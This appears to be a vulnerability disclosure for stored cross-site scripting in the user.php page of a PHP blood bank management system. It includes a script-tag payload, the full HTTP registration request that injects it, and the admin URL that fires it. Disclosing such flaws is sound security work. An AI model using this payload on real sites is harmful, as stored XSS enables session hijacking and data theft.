# blood-bank-system-in-php has Cross Site Scripting vulnerability in user.php

## supplier 
https://code-projects.org/blood-bank-system-in-php-with-source-code/
## Vulnerability file
user.php

## describe
There are unrestricted cross site scripting attacks and injection attacks in the blood-bank-system-in-php. The controllable parameters are as follows: user parameter. This function will execute the user parameter without restriction into the echo statement. Malicious attackers can exploit this vulnerability to obtain sensitive information from clients

**Code analysis**

Querying data from the database and storing it in the $row [] array, and the echo $user is not filtered, resulting in the execution of XSS statements.

## POC

insert xss into databases.

```
user = </td><script>alert(22);</script>
```

```
POST /register.php HTTP/1.1
Host: bloodbankmgmtsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Origin: http://bloodbankmgmtsystem
Connection: close
Referer: http://bloodbankmgmtsystem/register.php
Cookie: PHPSESSID=d6hubsm42i543rs5qj6sg7bth2
Upgrade-Insecure-Requests: 1
Priority: u=0, i

user=%3C%2Ftd%3E%3Cscript%3Ealert%2822%29%3B%3C%2Fscript%3E&pass=1
```

![](https://github.com/LucasArcher9274/CVE/blob/main/image-20241124231525482.png)

![](https://github.com/LucasArcher9274/CVE/blob/main/image-20241124231654004.png)



Visit this URL to trigger the cross-site scripting vulnerability.

```
http://bloodbankmgmtsystem/admin/user.php
```

**Result**

![](https://github.com/LucasArcher9274/CVE/blob/main/image-20241124231716019.png)

 